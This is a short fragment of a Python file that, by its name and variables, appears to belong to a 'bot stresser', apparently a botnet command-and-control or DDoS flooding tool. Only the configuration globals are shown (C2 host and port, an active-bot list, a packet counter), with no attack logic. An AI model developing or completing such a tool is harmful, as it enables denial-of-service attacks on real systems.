# ai_bot_stresser_9_fixed.py - MODIFIED VERSION WITH REAL-TIME ACTIVE BOT LIST
...
C2_HOST = "127.0.0.1"
C2_PORT = 5000
C2_SERVER_RUNNING = False # Changed default to False
ACTIVE_BOTS = {} # Changed to dictionary
PACKETS_SENT = 0
